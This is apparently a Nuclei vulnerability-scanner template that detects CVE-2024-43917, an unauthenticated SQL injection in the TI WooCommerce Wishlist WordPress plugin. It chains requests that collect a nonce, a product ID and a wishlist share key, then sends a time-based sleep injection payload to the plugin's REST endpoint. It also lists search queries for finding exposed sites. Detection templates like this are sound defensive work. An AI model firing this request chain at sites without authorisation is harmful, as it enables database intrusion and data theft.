flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body
    regex:
    - '"nonce":"([a-z0-9]+)"'
    type: regex
  raw:
  - 'GET /?p=1 HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- extractors:
  - group: 1
    internal: true
    name: product_id
    part: body
    regex:
    - data-tinvwl_product_id="([0-9]+)"
    type: regex
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - data-tinvwl_product_id="
  raw:
  - 'GET /product-category/uncategorized/ HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - internal: true
    json:
    - .wishlist.share_key
    name: share_key
    part: body
    type: json
  raw:
  - 'POST /product-category/uncategorized/ HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNfcbSwJQX8ALWCMG


    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG

    Content-Disposition: form-data; name="form[tinvwl-hidden-fields]"


    []

    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG

    Content-Disposition: form-data; name="tinv_wishlist_id"



    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG

    Content-Disposition: form-data; name="tinv_wishlist_name"



    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG

    Content-Disposition: form-data; name="product_type"


    simple

    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG

    Content-Disposition: form-data; name="product_id"


    {{product_id}}

    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG

    Content-Disposition: form-data; name="product_variation"


    0

    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG

    Content-Disposition: form-data; name="product_action"


    addto

    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG

    Content-Disposition: form-data; name="redirect"


    {{RootURL}}/product-category/uncategorized/

    ------WebKitFormBoundaryNfcbSwJQX8ALWCMG--

    '
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - contains(content_type, 'application/json')
    - contains(body, 'product_id')
    type: dsl
  matchers-condition: and
  raw:
  - '@timeout: 20s

    GET /wp-json/wc/v3/wishlist/{{share_key}}/get_products?order=,(select*from(select(sleep(6)))a)--+-
    HTTP/1.1

    Host: {{Hostname}}

    X-WP-Nonce: {{nonce}}

    '
id: CVE-2024-43917
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:templateinvaders:ti_woocommerce_wishlist:*:*:*:*:free:wordpress:*:*
    cve-id: CVE-2024-43917
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.99424
    epss-score: 0.87392
  description: 'In the latest version (2.8.2 as of writing the article) and below,
    the plugin is vulnerable to a SQL injection vulnerability that allows any users
    to execute arbitrary SQL queries in the database of the WordPress site. No privileges
    are required to exploit the issue. The vulnerability is unpatched on the latest
    version and is tracked as the CVE-2024-43917.

    '
  impact: 'Unauthenticated attackers can execute time-based SQL injection to extract
    sensitive data from the WordPress database.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/ti-woocommerce-wishlist/"
    framework: wordpress
    max-request: 4
    product: ti_woocommerce_wishlist
    publicwww-query: /wp-content/plugins/ti-woocommerce-wishlist/
    vendor: templateinvaders
    verified: true
  name: WordPress TI WooCommerce Wishlist Plugin <= 2.8.2 - SQL Injection
  reference:
  - https://patchstack.com/articles/unpatched-sql-injection-vulnerability-in-ti-woocommerce-wishlist-plugin/
  - https://patchstack.com/database/vulnerability/ti-woocommerce-wishlist/wordpress-ti-woocommerce-wishlist-plugin-2-8-2-sql-injection-vulnerability?_s_id=cve
  - https://nvd.nist.gov/vuln/detail/CVE-2024-43917
  remediation: 'Update TI WooCommerce Wishlist plugin to a version that patches CVE-2024-43917.

    '
  severity: critical
  tags: time-based-sqli,cve,cve2024,wp,wordpress,ti-woocommerce-wishlist,wp-plugin,sqli,vkev,vuln
